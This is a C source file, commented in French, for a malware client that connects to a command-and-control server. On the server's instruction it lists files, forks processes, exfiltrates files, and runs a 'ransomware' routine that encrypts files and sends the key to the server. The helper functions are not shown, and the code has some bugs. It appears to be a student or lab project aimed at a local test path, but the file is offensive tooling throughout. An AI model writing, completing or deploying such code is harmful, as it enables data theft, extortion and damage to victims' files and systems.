#include "common.h"
#include "fonction.h" // Inclusion pour la declaration de listFiles

#define SERVER_IP "127.0.0.1" // Adresse IP du serveur
#define SERVER_PORT 8081
#define ID_LENGTH 8

void printClientBanner() {
    printf("        ___            __\n");
    printf("  _____/ (_)__  ____  / /_\n");
    printf(" / ___/ / / _ \\/ __ \\/ __/\n");
    printf("/ /__/ / /  __/ / / / /_  \n");
    printf("\\___/_/_/\\___/_/ /_/\\__/  \n");
    printf("\n");
}
char fichier[30];

void handleCommand(my_socket_t clientSocket, const char *command) {
		if (strcmp(command, "list") == 0) {
			printf("Commande 'list' reçue. Execution...\n");
			listFiles(clientSocket); // Envoi des fichiers listes au serveur
		}
		if (strcmp(command, "fork") == 0) {
			printf("Commande 'fork' reçue. Execution...\n");
			custom_fork();
		}
		if (strcmp(command, "exfiltration") == 0) {
			printf("Commande 'exfiltration' reçue. Execution...\n");
			exfiltration(clientSocket, "./", fichier);
		}
		if (strcmp(command, "ransomware") == 0) {
			printf("Commande 'ransomware' reçue. Execution...\n");
			char encryptionKey[17]; // 16 caractères + null terminator
			generateEncryptionKey(encryptionKey, sizeof(encryptionKey));
			printf("Generated encryption key: %s\n", encryptionKey);

			// Exemple de chiffrement (remplacez par une vraie logique si nécessaire)
			encryptFiles("C:\\Users\\utilisateur\\Documents\\final_client\\test.txt", encryptionKey);

			// Envoi de la clé au serveur
			if (send(clientSocket, encryptionKey, (int)strlen(encryptionKey), 0) < 0) {
				perror("Echec de l'envoi de la clé de chiffrement");
			} else {
				printf("Clé de chiffrement envoyee au serveur.\n");
			}

			// Suppression de la clé du client après envoi
			memset(encryptionKey, 0, sizeof(encryptionKey));
			printf("Clé de chiffrement supprimée du client.\n");
		}
		else {
			printf("Commande inconnue ou non prise en charge : %s\n", command);
		}
}

int main() {
    printClientBanner();
	char identifiant[ID_LENGTH + 1];
	generer_client_id(identifiant, ID_LENGTH);
	printf("Identifiant genere : %s\n", identifiant);

    // Initialisation de Winsock sous Windows
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Echec de l'initialisation de Winsock. Code d'erreur : %d\n", WSAGetLastError());
        return 1;
    }
#endif

    my_socket_t clientSocket;
    struct sockaddr_in serverAddr;

    // Creation du socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET_VALUE) {
        perror("Echec de la creation du socket");
#ifdef _WIN32
        printf("WSA Error Code: %d\n", WSAGetLastError());
        WSACleanup();
#endif
        return 1;
    }else {
        printf("Socket créé avec succès.\n");
    }


    // Configuration de l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (serverAddr.sin_addr.s_addr == INADDR_NONE) {
        perror("Adresse IP invalide ou non supportee");
        closesocket(clientSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }else {
        printf("Adresse IP configurée : %s\n", SERVER_IP);
	}
    // Connexion au serveur
    printf("Tentative de connexion au serveur %s:%d...\n", SERVER_IP, SERVER_PORT);
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Echec de la connexion au serveur");
#ifdef _WIN32
        printf("WSA Error Code: %d\n", WSAGetLastError());
#endif
        closesocket(clientSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }
    printf("Connecte au serveur avec succes.\n");
	send(clientSocket, identifiant, strlen(identifiant), 0);
	printf("Identifiant envoye au serveur : %s\n", identifiant);

    // Communication avec le serveur
    char buffer[4096]; // Augmenté la taille pour recevoir de grandes listes
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            printf("Connexion fermee par le serveur ou erreur de réception.\n");
            break;
        }
        buffer[bytesReceived] = '\0'; // Terminaison de chaîne
        printf("Commande reçue : %s\n", buffer);
		if ( buffer == "exfiltration"){
			printf("Exfiltration process specifique ");
			recv(clientSocket, fichier,sizeof(fichier),0);
			printf("%s",fichier);
			handleCommand(clientSocket, buffer);
		}
        if (strcmp(buffer, "exit") == 0) {
            printf("Commande 'exit' reçue. Fermeture...\n");
            break;
        }
		else{
			handleCommand(clientSocket, buffer);
		}
    }

    // Fermeture du socket
    closesocket(clientSocket);
    printf("Socket ferme.\n");

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
